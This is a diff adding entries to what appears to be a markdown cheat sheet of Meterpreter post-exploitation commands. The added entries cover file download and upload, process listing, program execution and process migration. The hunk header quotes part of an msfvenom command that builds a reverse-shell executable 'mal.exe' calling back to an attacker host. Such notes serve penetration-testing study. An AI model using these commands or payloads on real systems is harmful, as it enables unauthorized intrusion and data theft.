@@ -142,3 +142,27 @@ exe LHOST=192.168.1.1 LPORT=4444 > mal.exe
     - `lcd` : Change directory on local (attacker's) machine
 
     - `pwd / getwd` : Display current working directory
+    
+    - `ls` : Show the contents of the directory
+
+    - `cat` : Display the contents of a file on screen
+
+    -`download / upload` : Move files to/from the target machine
+
+    - `mkdir / rmdir` : Make / remove directory
+
+    - `edit` : Open a file in the default editor (typically vi)
+
+- ##### Process Commands:
+
+    - `getpid` : Display the process ID that Meterpreter is running inside.
+
+    - `getuid` : Display the user ID that Meterpreter is running with.
+
+    - `ps` : Display process list.
+
+    - `kill` : Terminate a process given its process ID.
+
+    - `execute` : Run a given program with the privileges of the process the Meterpreter is loaded in.
+
+    - `migrate` : Jump to a given destination process ID
